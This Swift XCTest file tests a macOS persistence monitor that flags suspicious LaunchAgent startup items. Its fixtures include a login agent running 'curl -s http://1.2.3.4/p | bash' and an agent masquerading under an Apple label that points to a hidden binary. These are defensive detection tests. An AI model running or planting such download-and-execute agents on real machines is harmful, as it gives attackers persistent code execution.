import Foundation
import XCTest
@testable import GhostProcessSniperCore

final class PersistenceMonitorTests: XCTestCase {
    private var home: URL!
    private var agents: URL { home.appendingPathComponent("Library/LaunchAgents") }

    override func setUpWithError() throws {
        home = FileManager.default.temporaryDirectory.appendingPathComponent("sentinel-home-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: agents, withIntermediateDirectories: true)
    }

    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(at: home)
    }

    private func writeAgent(_ label: String, arguments: [String]) throws {
        let plist: [String: Any] = ["Label": label, "ProgramArguments": arguments, "RunAtLoad": true]
        let data = try PropertyListSerialization.data(fromPropertyList: plist, format: .xml, options: 0)
        try data.write(to: agents.appendingPathComponent("\(label).plist"))
    }

    private func item(_ label: String, arguments: [String], isNew: Bool = false) throws -> LaunchItem {
        try writeAgent(label, arguments: arguments)
        return try XCTUnwrap(PersistenceMonitor.read(agents.appendingPathComponent("\(label).plist").path,
                                                     scope: .userAgent, modified: nil, isNew: isNew))
    }

    func testInlineShellScriptAtLoginIsSuspicious() throws {
        let agent = try item("com.update.helper", arguments: ["/bin/bash", "-c", "curl -s http://1.2.3.4/p | bash"])
        XCTAssertGreaterThanOrEqual(agent.severity, .suspicious)
        XCTAssertTrue(agent.signals.contains { $0.kind == .downloadAndExecute })
        XCTAssertTrue(agent.signals.contains { $0.kind == .persistence })
    }

    func testAppleNameInUserLibraryIsAMasquerade() throws {
        let agent = try item("com.apple.softwareupdate.agent", arguments: ["/Users/Shared/.u/agent"])
        XCTAssertTrue(agent.signals.contains { $0.kind == .masquerade })
        XCTAssertTrue(agent.signals.contains { $0.kind == .hiddenLocation })
    }

    func testStartupItemRunningAHiddenFileInTheHomeFolderIsFlagged() throws {
        let agent = try item("com.example.helper", arguments: ["/Users/me/.helper"])
        XCTAssertTrue(agent.signals.contains { $0.kind == .hiddenLocation && $0.severity >= .notable }, "\(agent.signals)")
    }

    func testOrdinaryHomebrewServiceIsQuiet() throws {
        let agent = try item("homebrew.mxcl.postgresql@16", arguments: ["/bin/ls", "-l"])
        XCTAssertLessThan(agent.severity, .notable, "\(agent.signals)")
    }

    func testAgentWrittenWhileWatchingIsNewAndWakesTheRadar() throws {
        let woke = expectation(description: "a new startup item wakes the radar")
        woke.assertForOverFulfill = false
        let monitor = PersistenceMonitor(folders: [(agents.path, .userAgent)]) { woke.fulfill() }
        monitor.start()
        XCTAssertTrue(monitor.snapshot().items.isEmpty)

        try writeAgent("com.example.new", arguments: ["/usr/bin/true"])
        wait(for: [woke], timeout: 5)
        let items = monitor.snapshot().items
        XCTAssertEqual(items.first?.label, "com.example.new")
        XCTAssertEqual(items.first?.isNew, true)
        XCTAssertTrue(items.first?.signals.contains { $0.kind == .persistence } ?? false)
    }
}
